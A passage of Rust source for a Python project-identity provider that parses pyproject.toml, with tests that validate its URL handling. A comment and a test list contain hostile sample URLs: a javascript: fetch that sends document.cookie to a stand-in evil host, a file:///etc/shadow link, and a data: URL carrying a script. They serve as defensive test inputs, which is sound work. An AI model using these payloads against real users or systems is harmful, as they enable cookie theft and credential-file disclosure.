//! Python stack `project_identity` + `project_units` providers.
//!
//! Parses `pyproject.toml` (PEP 621) for name, version, description, license,
//! authors, Python requirement, homepage, and repository. Detects uv by the
//! presence of `uv.lock` or `[tool.uv]` and surfaces it in the stack detail.
//! Workspace members come from `[tool.uv.workspace].members`.
//!
//! Parse and read errors fall back to defaults; non-NotFound read errors and
//! parse errors are reported via `tracing` (`debug!` / `warn!`) so a malformed
//! manifest does not silently look like a missing one (TASK-0394).

// READ-10 / TASK-1761: `unwrap_used` only — the test modules `.unwrap()`
// tempdir / serde results throughout, and a `Result`-returning test would
// bury the assertion. The crate performs no numeric conversion of any kind,
// so the `cast_*` allows that used to sit here were pre-authorisation for
// casts nobody had reviewed; `docs/clippy.md` requires the narrowest scope
// that works.
#![cfg_attr(test, allow(clippy::unwrap_used))]

mod units;

use std::path::Path;

use ops_about::identity::{provide_identity_from_manifest, ParsedManifest};
// DUP-3 / TASK-1258: route through the shared
// [`ops_about::text_util::trim_nonempty`] so the about-python and about-node
// ERR-2 contracts are pinned at the same source location.
// DUP-3 / TASK-1758: same reasoning for `contains_control_chars`, and
// SEC-11 / TASK-1755 for the `has_allowed_url_scheme` allowlist.
use ops_about::text_util::{contains_control_chars, has_allowed_url_scheme, trim_nonempty};
use ops_core::project_identity::{base_about_fields, insert_homepage_field, AboutFieldDef};
use ops_extension::{Context, DataProvider, DataProviderError, ExtensionType};
use serde::Deserialize;

const NAME: &str = "about-python";
const DESCRIPTION: &str = "Python project identity";
const SHORTNAME: &str = "about-python";
const DATA_PROVIDER_NAME: &str = "project_identity";

#[non_exhaustive]
pub struct AboutPythonExtension;

ops_extension::impl_extension! {
    AboutPythonExtension,
    name: NAME,
    description: DESCRIPTION,
    shortname: SHORTNAME,
    types: ExtensionType::DATASOURCE,
    stack: Some(ops_extension::Stack::Python),
    data_provider_name: Some(DATA_PROVIDER_NAME),
    register_data_providers: |_self, registry| {
        let _ = registry.register(DATA_PROVIDER_NAME, Box::new(PythonIdentityProvider));
        let _ = registry.register(units::PROVIDER_NAME, Box::new(units::PythonUnitsProvider));
    },
    factory: PYTHON_ABOUT_FACTORY = |_, _| {
        Some((NAME, Box::new(AboutPythonExtension)))
    },
}

struct PythonIdentityProvider;

impl DataProvider for PythonIdentityProvider {
    fn name(&self) -> &'static str {
        DATA_PROVIDER_NAME
    }

    fn about_fields(&self) -> Vec<AboutFieldDef> {
        let mut fields = base_about_fields();
        insert_homepage_field(&mut fields);
        fields
    }

    fn provide(&self, ctx: &mut Context) -> Result<serde_json::Value, DataProviderError> {
        // DUP-1 (TASK-0484): proof-of-concept of `provide_identity_from_manifest`
        // — the parse-once / build-identity scaffold lives in `ops_about`,
        // and the Python provider only needs to project pyproject.toml onto
        // a [`ParsedManifest`].
        provide_identity_from_manifest(ctx.working_directory(), |root| {
            let Pyproject {
                name,
                version,
                description,
                license,
                requires_python,
                authors,
                homepage,
                repository,
                has_tool_uv,
            } = parse_pyproject(root).unwrap_or_default();

            // SEC-25 (mirrors extensions-node/about/src/package_manager.rs::probe):
            // use symlink_metadata so a hostile uv.lock symlink isn't followed
            // to an arbitrary target during workspace probing.
            let uses_uv = std::fs::symlink_metadata(root.join("uv.lock")).is_ok() || has_tool_uv;
            let stack_detail = build_stack_detail(requires_python.as_deref(), uses_uv);

            // TASK-2203: the packages row must carry the same count the units
            // provider lists — one per resolved `[tool.uv.workspace]` member —
            // read through the shared manifest cache (DUP-3 / TASK-0816) so
            // the card and the workspace table cannot drift. A
            // single-package project (no workspace table, or members globs
            // matching nothing) keeps `None`: a label with no value renders a
            // blank row, and "1" would be as meaningless as the Go stack's
            // omitted root-module count.
            let workspace_members = units::read_workspace_members(root);
            let module_count = (!workspace_members.is_empty()).then_some(workspace_members.len());

            ParsedManifest::build(|m| {
                m.name = name;
                m.version = version;
                m.description = description;
                m.license = license;
                m.authors = authors;
                m.homepage = homepage;
                m.repository = repository;
                m.stack_label = "Python";
                m.stack_detail = stack_detail;
                m.module_label = "packages";
                m.module_count = module_count;
            })
        })
    }
}

/// Compose the `stack_detail` string from optional `requires-python` value
/// and a boolean indicating whether uv is in use.
fn build_stack_detail(requires_python: Option<&str>, uses_uv: bool) -> Option<String> {
    match (requires_python, uses_uv) {
        (Some(v), true) => Some(format!("Python {v} · uv")),
        (Some(v), false) => Some(format!("Python {v}")),
        (None, true) => Some("uv".to_string()),
        (None, false) => None,
    }
}

// --- pyproject.toml parsing (PEP 621) ---

#[derive(Debug, Default)]
struct Pyproject {
    name: Option<String>,
    version: Option<String>,
    description: Option<String>,
    license: Option<String>,
    requires_python: Option<String>,
    authors: Vec<String>,
    homepage: Option<String>,
    repository: Option<String>,
    has_tool_uv: bool,
}

/// PATTERN-1 / TASK-1774: `[project]` is held as an untyped `toml::Table` and
/// each key is projected onto its own shape by [`project_field`], instead of
/// being deserialised into one all-or-nothing struct.
///
/// `Option<T>` on a struct field models *absence*, never a *type mismatch*, so
/// the previous shape aborted the whole deserialisation on any single bad key.
/// A manifest carrying `authors = ["Alice <a@x.com>"]` — the Poetry
/// `[tool.poetry]` spelling, which authors migrating to PEP 621 routinely
/// carry over — is well-formed TOML and mostly valid PEP 621, yet it collapsed
/// the entire identity to the directory-name fallback with no version, no
/// license, no description and no URLs, even though `name` and `version` sat
/// well-formed in the same table.
#[derive(Debug, Deserialize)]
struct RawPyproject {
    project: Option<toml::Table>,
    tool: Option<RawTool>,
}

/// Deserialise one `[project]` key, degrading that key alone on a type
/// mismatch.
///
/// PATTERN-1 / TASK-1774: a failure warns with the offending field path and
/// yields `None`, so every other key still populates the identity.
fn project_field<T>(project: &toml::Table, key: &str, manifest_path: &Path) -> Option<T>
where
    T: for<'de> Deserialize<'de>,
{
    let value = project.get(key)?;
    match T::deserialize(value.clone()) {
        Ok(parsed) => Some(parsed),
        Err(e) => {
            // ERR-7 / TASK-0974: Debug-format the path so embedded newlines /
            // ANSI in an attacker-controlled checkout path cannot forge log
            // records.
            tracing::warn!(
                path = ?manifest_path.display(),
                field = %format!("project.{key}"),
                error = %e,
                recovery = "skip-field",
                "failed to project a pyproject [project] field; other fields are unaffected"
            );
            None
        }
    }
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum LicenseField {
    Text(String),
    Table {
        text: Option<String>,
        file: Option<String>,
    },
}

#[derive(Debug, Deserialize)]
struct RawAuthor {
    name: Option<String>,
    email: Option<String>,
}

/// One entry of `[project].authors`.
///
/// PATTERN-1 / TASK-1774: PEP 621 specifies the `{ name, email }` table form,
/// but the bare-string form (`authors = ["Alice <a@x.com>"]`) is what Poetry
/// uses and is common in the wild. Accepting both — and tolerating anything
/// else as a skipped entry rather than a hard deserialisation failure — keeps
/// one odd author from discarding the rest of `[project]`.
#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum RawAuthorEntry {
    Table(RawAuthor),
    Name(String),
    Unsupported(toml::Value),
}

/// One entry of `[project.urls]`.
///
/// PATTERN-1 / TASK-2202: PEP 621 specifies string values, but nothing stops
/// tooling drift or hand edits from emitting a nested table
/// (`Funding = { url = "..." }`) or another non-string shape. Degrading
/// per-entry — mirroring `RawAuthorEntry` — keeps one odd value from failing
/// the whole map and discarding both `homepage` and `repository`.
#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum RawUrlEntry {
    Url(String),
    Unsupported(toml::Value),
}

#[derive(Debug, Deserialize)]
struct RawTool {
    // PERF-3 / TASK-0569: only presence of `[tool.uv]` matters here. Using
    // `serde::de::IgnoredAny` skips the entire subtree (often holding
    // dev-dependencies, sources, indexes) instead of materialising it into
    // an arbitrary `toml::Value` that is immediately thrown away.
    uv: Option<serde::de::IgnoredAny>,
}

fn parse_pyproject(project_root: &Path) -> Option<Pyproject> {
    // DUP-3 / TASK-0816: read+parse pyproject.toml at most once per project
    // root for the lifetime of the process; the units provider deserialises
    // its own shape from the same shared `toml::Value`.
    // PERF-3 / TASK-0854: read directly from the cached raw text and let
    // toml::from_str project straight into RawPyproject — avoids the prior
    // `(*value).clone().try_into()` which materialised a fresh 2-10 KB
    // toml::Value tree per provider call.
    let text = ops_about::manifest_cache::for_filename("pyproject.toml").read(project_root)?;
    let raw: RawPyproject = match toml::from_str(&text) {
        Ok(r) => r,
        Err(e) => {
            // ERR-7 / TASK-0974: include the manifest path so multi-root
            // `ops about` runs can attribute the parse failure. Debug-format
            // the path so embedded newlines / ANSI in attacker-controlled
            // checkout paths cannot forge log lines.
            tracing::warn!(
                path = ?project_root.join("pyproject.toml").display(),
                error = %e,
                recovery = "default-identity",
                "failed to project pyproject.toml into identity shape"
            );
            return None;
        }
    };

    let mut out = Pyproject {
        has_tool_uv: raw.tool.as_ref().and_then(|t| t.uv.as_ref()).is_some(),
        ..Pyproject::default()
    };

    if let Some(project) = raw.project {
        let manifest_path = project_root.join("pyproject.toml");
        out.name = trim_nonempty(project_field::<String>(&project, "name", &manifest_path));
        out.version = trim_nonempty(project_field::<String>(&project, "version", &manifest_path));
        out.description = trim_nonempty(project_field::<String>(
            &project,
            "description",
            &manifest_path,
        ));
        out.requires_python = trim_nonempty(project_field::<String>(
            &project,
            "requires-python",
            &manifest_path,
        ));
        out.license = project_field::<LicenseField>(&project, "license", &manifest_path)
            .and_then(normalize_license);
        out.authors = format_authors(
            project_field::<Vec<RawAuthorEntry>>(&project, "authors", &manifest_path)
                .unwrap_or_default(),
            &manifest_path,
        );
        if let Some(urls) = project_field::<std::collections::BTreeMap<String, RawUrlEntry>>(
            &project,
            "urls",
            &manifest_path,
        ) {
            let urls = filter_url_entries(urls, &manifest_path);
            let (homepage, repository) = extract_urls(&urls);
            out.homepage = homepage;
            out.repository = repository;
        }
    }

    Some(out)
}

/// PEP 621 license can be a string, `{ text = "..." }`, or `{ file = "LICENSE" }`.
/// The file form is a *path* to a file, not an SPDX identifier, so passing it
/// through as the license name is misleading. When only `file` is set, surface
/// it explicitly as `License file: <name>` so the About card communicates that
/// an SPDX identifier was not declared but a license file is present.
/// ERR-2 / TASK-0704: trim+drop-empty for license text so a whitespace-only
/// field does not render as a blank bullet.
fn normalize_license(license: LicenseField) -> Option<String> {
    match license {
        LicenseField::Text(s) => trim_nonempty(Some(s)),
        // PATTERN-1 / TASK-1759: try the arms in *value* order, not field
        // order. Matching on `text: Some(_)` first let a whitespace-only
        // `text` claim the match and return `None`, so the `file` arm was
        // unreachable for `{ text = "  ", file = "LICENSE" }` — a shape any
        // generator that emits every PEP 621 key produces — and the About
        // card showed no license although the manifest declared one.
        LicenseField::Table { text, file } => trim_nonempty(text)
            .or_else(|| trim_nonempty(file).map(|f| format!("License file: {f}"))),
    }
}

/// ERR-2 / TASK-0704: trim+drop-empty for each author component so a
/// whitespace-only field does not render as a blank bullet — matching
/// package.json's `format_person`.
fn format_authors(authors: Vec<RawAuthorEntry>, manifest_path: &Path) -> Vec<String> {
    authors
        .into_iter()
        .filter_map(|entry| match entry {
            RawAuthorEntry::Table(a) => {
                let name = trim_nonempty(a.name);
                let email = trim_nonempty(a.email);
                match (name, email) {
                    (Some(n), Some(e)) => Some(format!("{n} <{e}>")),
                    (Some(n), None) => Some(n),
                    // ERR-2 / TASK-0980: render the email-only case as
                    // `<email>` to match `extensions-node/about::format_person`
                    // — both providers feed the same About card schema and a
                    // bare email next to "Name <email>" entries renders
                    // inconsistently in a multi-author list.
                    (None, Some(e)) => Some(format!("<{e}>")),
                    (None, None) => None,
                }
            }
            // PATTERN-1 / TASK-1774: the Poetry-style bare string is already
            // in the rendered `Name <email>` shape, so pass it through after
            // the same ERR-2 trim+drop.
            RawAuthorEntry::Name(s) => trim_nonempty(Some(s)),
            RawAuthorEntry::Unsupported(value) => {
                tracing::warn!(
                    path = ?manifest_path.display(),
                    field = "project.authors",
                    kind = value.type_str(),
                    recovery = "skip-author",
                    "unsupported [project].authors entry; keeping the remaining authors"
                );
                None
            }
        })
        .collect()
}

/// PATTERN-1 / TASK-2202: degrade the `[project.urls]` table per-entry. A
/// non-string value (e.g. the nested `Funding = { url = ... }` shape PEP 621
/// tooling drift produces) warns with the offending key and is skipped, so
/// the string-valued siblings still populate the About card — the same
/// per-entry recovery `RawAuthorEntry::Unsupported` gives `authors`.
fn filter_url_entries(
    entries: std::collections::BTreeMap<String, RawUrlEntry>,
    manifest_path: &Path,
) -> std::collections::BTreeMap<String, String> {
    let mut out = std::collections::BTreeMap::new();
    for (key, entry) in entries {
        match entry {
            RawUrlEntry::Url(url) => {
                out.insert(key, url);
            }
            RawUrlEntry::Unsupported(value) => {
                // SEC-21: the key derives from verbatim `pyproject.toml`
                // text, so Debug-format it (same policy as the
                // `normalize_urls` collision warn) to keep embedded
                // newlines / ANSI from forging log records.
                tracing::warn!(
                    path = ?manifest_path.display(),
                    field = "project.urls",
                    key = ?key,
                    kind = value.type_str(),
                    recovery = "skip-entry",
                    "unsupported [project.urls] value; keeping string-valued siblings"
                );
            }
        }
    }
    out
}

fn extract_urls(
    urls: &std::collections::BTreeMap<String, String>,
) -> (Option<String>, Option<String>) {
    // PERF-3 / TASK-0991: normalise each URL key exactly once per About
    // call. Previously `pick_url` built a fresh `Vec<(String, &String)>`
    // and re-ran `normalize_url_key` over every key on each invocation;
    // `extract_urls` calls `pick_url` twice, so the work was duplicated.
    let normalized = normalize_urls(urls);
    // PATTERN-1 / TASK-1062: PEP 621 distinguishes `Homepage` from
    // `Documentation` as separate, semantically distinct labels. Folding
    // `documentation` into the homepage slot misrepresents a docs-only
    // pyproject as having its docs URL as the homepage, and silently
    // discards Documentation when both are present. Drop it from the
    // homepage candidate list so its absence falls through to None. If the
    // About card grows a Documentation field, surface it as its own bullet.
    let homepage = pick_url(&normalized, &["homepage", "home", "home-page"]);
    let repository = pick_url(
        &normalized,
        &[
            "repository",
            "source",
            "source-code",
            "sourcecode",
            "code",
            "repo",
        ],
    );
    (homepage, repository)
}

/// PEP 621 places no constraints on `[project.urls]` key casing or spelling
/// (`Homepage`, `homepage`, `Home Page`, `home-page` are all common in the
/// wild). Look up candidates case-insensitively after trimming, and accept the
/// kebab-case variant as equivalent to the space-separated form. Callers should
/// pass the canonical kebab/space form for each variant — "home-page" and
/// "home page" normalise identically, so passing both is dead weight.
/// PERF-3 / TASK-0991: shared normalisation pass — once per About call,
/// rather than once per `pick_url` candidate-set.
///
/// PATTERN-1 / TASK-1110: PEP 621 places no constraints on key casing or
/// punctuation. Two source keys can collapse under `normalize_url_key` —
/// e.g. `"Homepage"` and `"home page"`, or `"Source-Code"` and
/// `"source code"`. A naive `.collect()` into a `HashMap` would silently
/// keep an arbitrary winner (last-write-wins by `BTreeMap` iteration order)
/// and discard the other URL with no diagnostic. Walk the map explicitly,
/// keep the first-seen entry, and emit a `tracing::warn!` naming both
/// raw keys and both URLs so the operator sees the schema drift instead
/// of a silently dropped URL. Same finding class as TASK-1019 / TASK-1100.
///
/// PERF-3 / TASK-1769: one map keyed by the normalised key, holding the
/// first-seen `(raw_key, url)` pair. The previous shape kept a second
/// same-sized `first_seen_raw` map read on exactly one line — the collision
/// warn — which forced a `norm.clone()` per key and needed a `map_or("")`
/// fallback for a key that is structurally guaranteed to be present. Holding
/// both halves in one entry makes that invariant structural rather than
/// something two containers must keep in lockstep.
fn normalize_urls(
    urls: &std::collections::BTreeMap<String, String>,
) -> std::collections::HashMap<String, (&String, &String)> {
    let mut out: std::collections::HashMap<String, (&String, &String)> =
        std::collections::HashMap::with_capacity(urls.len());
    for (k, v) in urls {
        let norm = normalize_url_key(k);
        if let Some((first_key, first_url)) = out.get(&norm) {
            // SEC-21: every field here derives from verbatim
            // `pyproject.toml` text — an untrusted key or URL carrying a
            // newline or an SGR sequence could otherwise forge a log record.
            // Debug-format them all so they arrive quoted and escaped.
            // `normalized_key` is no exception: `normalize_url_key` only
            // trims the *ends*, lowercases, and maps `-` to a space, so an
            // interior newline or ESC survives normalisation untouched and
            // Display-formatting it would reopen the same hole.
            tracing::warn!(
                normalized_key = ?norm,
                first_key = ?first_key,
                first_url = ?first_url,
                duplicate_key = ?k,
                duplicate_url = ?v,
                recovery = "keep-first",
                "pyproject [project.urls] keys collapse under normalisation; keeping first-seen entry"
            );
            continue;
        }
        out.insert(norm, (k, v));
    }
    out
}

fn pick_url(
    normalized: &std::collections::HashMap<String, (&String, &String)>,
    keys: &[&str],
) -> Option<String> {
    let raw = keys.iter().find_map(|target| {
        let target_norm = normalize_url_key(target);
        normalized.get(&target_norm).map(|(_, v)| (*v).clone())
    });
    // DUP-3 / TASK-1258: route through the shared trim+drop helper rather
    // than reimplement the chain inline. TASK-0964 / ERR-2 / TASK-0704
    // semantics are preserved: a whitespace-only URL renders as "no
    // homepage" instead of an empty About bullet.
    //
    // SEC-2 / TASK-1207: any control byte (C0 / DEL / Unicode `is_control`)
    // drops the field entirely, mirroring the SEC-2 / TASK-1165 policy in
    // `extensions-node/about::repo_url::normalize_repo_url`. Stripping would
    // silently concatenate the attacker-controlled tail
    // (`https://demo.dev\nINJECT` → `https://demo.devINJECT`) into a
    // clickable URL; dropping surfaces the field as missing.
    //
    // SEC-11 / TASK-1755: the value must additionally carry an allowlisted
    // scheme (`https://` / `http://`, see
    // [`ops_about::text_util::has_allowed_url_scheme`]). `pyproject.toml` is
    // untrusted input, and without the allowlist a
    // `Homepage = "javascript:fetch('https://evil.tld/?c='+document.cookie)"`
    // or `Repository = "file:///etc/shadow"` flowed verbatim into the About
    // card, `ops about --json`, and every markdown / HTML surface downstream
    // of them. Rejection drops the field to `None`, the same drop-not-strip
    // policy SEC-2 / TASK-1207 applies to control characters, rather than
    // emitting a partial URL. Scheme-less values are rejected rather than
    // guessed at. Sibling policy: SEC-11 / TASK-1722 in
    // `extensions-node/about::repo_url::normalize_repo_url`.
    trim_nonempty(raw)
        .filter(|s| !contains_control_chars(s))
        .filter(|s| has_allowed_url_scheme(s))
}

fn normalize_url_key(key: &str) -> String {
    key.trim().to_ascii_lowercase().replace('-', " ")
}

#[cfg(test)]
mod tests {
    use super::*;
    use ops_about::test_support::capture_tracing;
    use ops_core::project_identity::ProjectIdentity;

    /// DUP-1 / TASK-1763: sixteen tests in this module opened with the same
    /// five-statement tempdir / write / `test_context` / deserialise preamble,
    /// which buried the one line per test that states the contract and made
    /// every `provide` signature change a sixteen-site edit. The two shapes
    /// below carry that preamble once.
    fn identity_from(pyproject: &str) -> ProjectIdentity {
        identity_from_with_files(pyproject, &[])
    }

    /// [`identity_from`] plus extra fixture files written relative to the
    /// project root — `uv.lock` and `.git/config` are the two cases that need
    /// them.
    fn identity_from_with_files(pyproject: &str, extra: &[(&str, &str)]) -> ProjectIdentity {
        let dir = tempfile::tempdir().unwrap();
        ops_about::test_support::write_file(&dir.path().join("pyproject.toml"), pyproject);
        for (relative, content) in extra {
            ops_about::test_support::write_file(&dir.path().join(relative), content);
        }
        identity_at(dir.path())
    }

    /// Run the provider against an existing project root. Split out so the
    /// no-manifest case can share the deserialise step without writing one.
    fn identity_at(root: &Path) -> ProjectIdentity {
        let provider = PythonIdentityProvider;
        let mut ctx = ops_extension::Context::test_context(root.to_path_buf());
        serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap()
    }

    /// ERR-7 (TASK-0818): manifest paths flow through `tracing::warn!` via
    /// the `?` formatter so embedded newlines or ANSI escapes cannot forge
    /// multi-line log records. DUP-3 / TASK-0985: shared helper — see
    /// `ops_about::test_support`.
    #[test]
    fn pyproject_path_debug_escapes_control_characters() {
        let p = Path::new("a\nb\u{1b}[31mc/pyproject.toml");
        ops_about::test_support::assert_debug_escapes_control_chars(p.display());
    }

    #[test]
    fn build_stack_detail_python_with_uv() {
        assert_eq!(
            build_stack_detail(Some(">=3.11"), true),
            Some("Python >=3.11 · uv".to_string())
        );
    }

    #[test]
    fn build_stack_detail_python_only() {
        assert_eq!(
            build_stack_detail(Some(">=3.11"), false),
            Some("Python >=3.11".to_string())
        );
    }

    #[test]
    fn build_stack_detail_uv_only() {
        assert_eq!(build_stack_detail(None, true), Some("uv".to_string()));
    }

    #[test]
    fn build_stack_detail_neither() {
        assert_eq!(build_stack_detail(None, false), None);
    }

    #[test]
    fn provider_name() {
        assert_eq!(PythonIdentityProvider.name(), "project_identity");
    }

    #[test]
    fn about_fields_include_homepage() {
        let fields = PythonIdentityProvider.about_fields();
        assert!(fields.iter().any(|f| f.id == "homepage"));
    }

    #[test]
    fn whitespace_only_license_and_author_components_are_dropped() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "0.1.0"
license = "  "
authors = [{ name = "  ", email = "  " }]
"#,
        );

        assert!(id.license.is_none());
        assert!(id.authors.is_empty());
    }

    #[test]
    fn whitespace_only_requires_python_does_not_render() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "0.1.0"
requires-python = "  "
"#,
        );

        assert_eq!(id.stack_detail, None);
    }

    #[test]
    fn pick_url_repository_takes_precedence_over_source_and_source_code() {
        const REPO_KEYS: &[&str] = &[
            "repository",
            "source",
            "source-code",
            "sourcecode",
            "code",
            "repo",
        ];

        let mut urls = std::collections::BTreeMap::new();
        urls.insert(
            "Source-Code".to_string(),
            "https://example.com/sc".to_string(),
        );
        urls.insert("source".to_string(), "https://example.com/src".to_string());
        urls.insert(
            "Repository".to_string(),
            "https://example.com/repo".to_string(),
        );

        let picked = pick_url(&normalize_urls(&urls), REPO_KEYS);
        assert_eq!(picked.as_deref(), Some("https://example.com/repo"));

        urls.remove("Repository");
        let picked = pick_url(&normalize_urls(&urls), REPO_KEYS);
        assert_eq!(picked.as_deref(), Some("https://example.com/src"));

        urls.remove("source");
        let picked = pick_url(&normalize_urls(&urls), REPO_KEYS);
        assert_eq!(picked.as_deref(), Some("https://example.com/sc"));
    }

    #[test]
    fn parse_minimal_pyproject() {
        let id = identity_from(
            r#"
[project]
name = "codeagent-bench"
version = "0.0.1"
description = "Benchmark harness for mix-and-match {coding-agent} x {MCP} x {prompts} evaluation"
readme = "README.md"
requires-python = ">=3.11"
license = { text = "MIT" }
authors = [{ name = "rsvaleri" }]
"#,
        );

        assert_eq!(id.name, "codeagent-bench");
        assert_eq!(id.version.as_deref(), Some("0.0.1"));
        assert_eq!(id.stack_label, "Python");
        assert_eq!(id.stack_detail.as_deref(), Some("Python >=3.11"));
        assert_eq!(id.license.as_deref(), Some("MIT"));
        assert_eq!(id.authors, vec!["rsvaleri"]);
        assert_eq!(id.module_label, "packages");
        // TASK-2203 AC #2: a single-package (non-workspace) pyproject keeps
        // `module_count = None` — the packages row carries no value.
        assert_eq!(id.module_count, None);
    }

    /// TASK-2203 AC #1 / AC #3: on one uv-workspace fixture, the identity
    /// card's `module_count` and the units provider's list must come from the
    /// same resolved member set, so the packages row and the workspace table
    /// cannot drift. Asserted together on the same fixture, with a member
    /// directory that resolves and one that does not (no pyproject.toml), so
    /// the count follows the *resolved* set rather than the raw glob text.
    #[test]
    fn uv_workspace_module_count_equals_the_units_provider_length() {
        let dir = tempfile::tempdir().unwrap();
        ops_about::test_support::write_file(
            &dir.path().join("pyproject.toml"),
            r#"
[project]
name = "root"
version = "0.0.0"

[tool.uv.workspace]
members = ["packages/*"]
"#,
        );
        ops_about::test_support::write_file(
            &dir.path().join("packages/alpha/pyproject.toml"),
            "[project]\nname = \"alpha\"\nversion = \"1.0.0\"\n",
        );
        ops_about::test_support::write_file(
            &dir.path().join("packages/beta/pyproject.toml"),
            "[project]\nname = \"beta\"\nversion = \"2.0.0\"\n",
        );
        // A directory under the glob with no pyproject.toml resolves to no
        // unit — and must not be counted.
        std::fs::create_dir_all(dir.path().join("packages/not-a-pkg")).unwrap();

        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let identity: ProjectIdentity =
            serde_json::from_value(PythonIdentityProvider.provide(&mut ctx).unwrap()).unwrap();
        let units: Vec<ops_core::project_identity::ProjectUnit> =
            serde_json::from_value(units::PythonUnitsProvider.provide(&mut ctx).unwrap()).unwrap();

        assert_eq!(units.len(), 2, "two members resolve, one does not");
        assert_eq!(
            identity.module_count,
            Some(units.len()),
            "the packages row must equal the units list length on the same fixture"
        );
    }

    #[test]
    fn detects_uv_from_lockfile() {
        let id = identity_from_with_files(
            r#"
[project]
name = "demo"
version = "0.1.0"
requires-python = ">=3.12"
"#,
            &[("uv.lock", "# uv lockfile\n")],
        );

        assert_eq!(id.stack_detail.as_deref(), Some("Python >=3.12 · uv"));
    }

    #[test]
    fn detects_uv_from_tool_table() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "0.1.0"

[tool.uv]
dev-dependencies = []
"#,
        );

        assert_eq!(id.stack_detail.as_deref(), Some("uv"));
    }

    #[test]
    fn license_file_form_is_labeled() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"
license = { file = "LICENSE" }
"#,
        );

        assert_eq!(id.license.as_deref(), Some("License file: LICENSE"));
    }

    /// PATTERN-1 / TASK-1759: matching on `text: Some(_)` before the `file`
    /// arm let a whitespace-only `text` claim the match and drop the license
    /// entirely, making the `file` arm unreachable for a shape any generator
    /// that emits every PEP 621 key produces.
    #[test]
    fn blank_license_text_falls_through_to_the_file_form() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"
license = { text = "  ", file = "LICENSE" }
"#,
        );

        assert_eq!(id.license.as_deref(), Some("License file: LICENSE"));
    }

    /// The fall-through must not resurrect a blank `file` either — both
    /// whitespace-only still drops the field (ERR-2 / TASK-0704).
    #[test]
    fn blank_license_text_and_file_still_drops() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"
license = { text = "  ", file = "  " }
"#,
        );

        assert!(id.license.is_none(), "got: {:?}", id.license);
    }

    /// A `text`-only table and an empty table keep their existing behaviour.
    #[test]
    fn license_table_text_only_and_empty_table_are_unchanged() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"
license = { text = "MIT" }
"#,
        );
        assert_eq!(id.license.as_deref(), Some("MIT"));

        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"
license = {}
"#,
        );
        assert!(id.license.is_none(), "got: {:?}", id.license);
    }

    #[test]
    fn parses_urls_case_insensitive_and_kebab() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"

[project.urls]
homepage = "https://demo.dev"
source-code = "https://github.com/x/demo"
"#,
        );

        assert_eq!(id.homepage.as_deref(), Some("https://demo.dev"));
        assert_eq!(id.repository.as_deref(), Some("https://github.com/x/demo"));
    }

    #[test]
    fn parses_urls_homepage_and_repository() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"

[project.urls]
Homepage = "https://demo.dev"
Repository = "https://github.com/x/demo"
"#,
        );

        assert_eq!(id.homepage.as_deref(), Some("https://demo.dev"));
        assert_eq!(id.repository.as_deref(), Some("https://github.com/x/demo"));
    }

    /// PATTERN-1 / TASK-2202 AC #1/#2: a `[project.urls]` table with one
    /// non-string value is well-formed TOML and must not fail the whole map
    /// (which used to drop both homepage and repository). The string-valued
    /// siblings survive and the skipped entry warns once, naming its key
    /// with a recovery field — the same per-entry degradation
    /// `RawAuthorEntry::Unsupported` gives `authors`.
    #[test]
    fn mixed_value_urls_table_keeps_string_siblings_and_warns_per_entry() {
        let (id, warn_count) = ops_about::test_support::count_warnings(|| {
            identity_from(
                r#"
[project]
name = "demo"
version = "1.0.0"

[project.urls]
Homepage = "https://demo.dev"
Repository = "https://github.com/x/demo"
Funding = { url = "https://sponsor.dev" }
"#,
            )
        });

        assert_eq!(id.homepage.as_deref(), Some("https://demo.dev"));
        assert_eq!(id.repository.as_deref(), Some("https://github.com/x/demo"));
        assert_eq!(warn_count, 1);
    }

    /// TASK-0964: a whitespace-only URL must drop to None instead of rendering
    /// as an empty About bullet, matching the trim+drop policy already applied
    /// to name/license/requires-python/authors.
    #[test]
    fn whitespace_only_url_resolves_to_none() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"

[project.urls]
Homepage = "   "
"#,
        );

        assert!(
            id.homepage.is_none(),
            "whitespace-only Homepage must drop, got: {:?}",
            id.homepage
        );
    }

    /// SEC-2 / TASK-1207: a `[project.urls]` value containing an embedded
    /// newline must not survive into ProjectIdentity.homepage — sister
    /// policy to extensions-node/about::strip_control_chars (TASK-1080) and
    /// the field-drop policy (TASK-1165). Stripping would silently
    /// concatenate `https://demo.dev\nINJECTED` into a clickable
    /// attacker-named URL; dropping surfaces the field as missing.
    #[test]
    fn homepage_with_embedded_newline_drops_field() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"

[project.urls]
Homepage = "https://demo.dev\nINJECTED"
"#,
        );

        assert!(
            id.homepage.is_none(),
            "Homepage with embedded LF must drop, got: {:?}",
            id.homepage
        );
    }

    /// SEC-2 / TASK-1207: a `[project.urls]` Repository value containing an
    /// embedded ANSI escape (U+001B) must not survive — would otherwise
    /// repaint the operator terminal when the About card is rendered.
    #[test]
    fn repository_with_embedded_ansi_drops_field() {
        let id = identity_from(
            r#"
[project]
name = "demo"
version = "1.0.0"

[project.urls]
Repository = "https://demo.dev\u001b[31mfake"
"#,
        );

        assert!(
            id.repository.is_none(),
            "Repository with embedded ANSI escape must drop, got: {:?}",
            id.repository
        );
    }

    /// SEC-11 / TASK-1755: `pyproject.toml` is untrusted input, so a
    /// `[project.urls]` value whose scheme is not on the `http(s)` allowlist
    /// must drop the field to `None` rather than reach the About card, the
    /// markdown / HTML surfaces, or `ops about --json` as a clickable
    /// `javascript:` / `data:` payload or a `file:` exfiltration link.
    #[test]
    fn non_allowlisted_url_schemes_drop_the_homepage_and_repository() {
        for hostile in [
            "javascript:fetch('https://evil.tld/?c='+document.cookie)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "file:///etc/shadow",
            "vbscript:msgbox(1)",
